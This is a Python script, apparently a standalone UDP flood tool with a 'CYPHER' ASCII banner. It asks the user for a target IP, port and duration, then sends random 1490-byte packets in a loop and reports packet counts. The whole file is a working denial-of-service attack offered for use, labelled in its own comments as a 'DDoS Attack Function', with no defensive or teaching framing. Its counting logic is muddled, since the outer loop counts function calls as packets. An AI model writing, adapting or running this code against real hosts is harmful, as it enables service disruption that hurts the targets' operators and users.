import socket
import random
import time

# Function to display your custom banner
def display_banner():
    banner = """
      CCCCCCCCCCCCCYYYYYYY       YYYYYYYPPPPPPPPPPPPPPPPP   HHHHHHHHH     HHHHHHHHHEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   
    CCC::::::::::::CY:::::Y       Y:::::YP::::::::::::::::P  H:::::::H     H:::::::HE::::::::::::::::::::ER::::::::::::::::R  
    CC:::::::::::::::CY:::::Y       Y:::::YP::::::PPPPPP:::::P H:::::::H     H:::::::HE::::::::::::::::::::ER::::::RRRRRR:::::R 
    C:::::CCCCCCCC::::CY::::::Y     Y::::::YPP:::::P     P:::::PHH::::::H     H:::::::HHEE::::::EEEEEEEEE::::ERR:::::R     R:::::R
    C:::::C       CCCCCCYYY:::::Y   Y:::::YYY  P::::P     P:::::P  H:::::H     H:::::H    E:::::E       EEEEEE  R::::R     R:::::R
    C:::::C                 Y:::::Y Y:::::Y     P::::P     P:::::P  H:::::H     H:::::H    E:::::E               R::::R     R:::::R
    C:::::C                  Y:::::Y:::::Y      P::::PPPPPP:::::P   H::::::HHHHH::::::H    E::::::EEEEEEEEEE     R::::RRRRRR:::::R 
    C:::::C                   Y:::::::::Y       P:::::::::::::PP    H:::::::::::::::::H    E:::::::::::::::E     R:::::::::::::RR  
    C:::::C                    Y:::::::Y        P::::PPPPPPPPP      H:::::::::::::::::H    E:::::::::::::::E     R::::RRRRRR:::::R 
    C:::::C                     Y:::::Y         P::::P              H::::::HHHHH::::::H    E::::::EEEEEEEEEE     R::::R     R:::::R
    C:::::C                     Y:::::Y         P::::P              H:::::H     H:::::H    E:::::E               R::::R     R:::::R
    C:::::C       CCCCCC       Y:::::Y         P::::P              H:::::H     H:::::H    E:::::E       EEEEEE  R::::R     R:::::R
    C:::::CCCCCCCC::::C       Y:::::Y       PP::::::PP          HH::::::H     H::::::HHEE::::::EEEEEEEE:::::ERR:::::R     R:::::R
    CC:::::::::::::::C    YYYY:::::YYYY    P::::::::P          H:::::::H     H:::::::HE::::::::::::::::::::ER::::::R     R:::::R
    CCC::::::::::::C    Y:::::::::::Y    P::::::::P          H:::::::H     H:::::::HE::::::::::::::::::::ER::::::R     R:::::R
    CCCCCCCCCCCCC    YYYYYYYYYYYYY    PPPPPPPPPP          HHHHHHHHH     HHHHHHHHHEEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR
    """

    print(banner)



# DDoS Attack Function
def ddos_attack(target_ip, target_port, attack_duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    sent_packets = 0
    successful_packets = 0
    failed_packets = 0

    start_time = time.time()

    while time.time() - start_time < attack_duration:
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            successful_packets += 1
        except socket.error:
            failed_packets += 1

    print(f"Sent {sent_packets} packets to {target_ip} through port {target_port}")
    print(f"Successful packets: {successful_packets}")
    print(f"Failed packets: {failed_packets}")

# Inside your main function or wherever you want to start the attack
def start_attack():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    attack_duration = int(input("Enter the attack duration in seconds: "))
    run_duration = int(input("Enter the total runtime of the script in seconds: "))

    print(f"Starting DDoS attack on {target_ip}:{target_port} for {attack_duration} seconds...")

    sent_packets = 0
    successful_packets = 0
    failed_packets = 0

    start_time = time.time()
    while time.time() - start_time < run_duration:
        try:
            ddos_attack(target_ip, target_port, attack_duration)
            sent_packets += 1
            successful_packets += 1
        except Exception as e:
            failed_packets += 1
            print(f"Error: {e}")

    print(f"Total failed packets: {failed_packets}")

# Call the function to display the banner
display_banner()

while True:
    start_attack()

    run_again = input("Do you want to run the code again? (yes/no): ").lower()
    if run_again != 'yes':
        print("Exiting the program. Goodbye:)")
        break
